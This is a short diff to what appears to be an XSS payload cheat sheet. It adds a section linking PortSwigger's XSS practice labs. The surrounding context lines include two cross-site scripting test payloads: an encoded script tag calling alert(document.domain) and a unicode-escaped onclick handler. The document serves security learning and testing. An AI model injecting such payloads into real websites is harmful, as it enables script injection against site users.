@@ -1227,6 +1227,10 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
 ```
 
+## Labs
+
+* [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
+
 ## References
 
 - [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
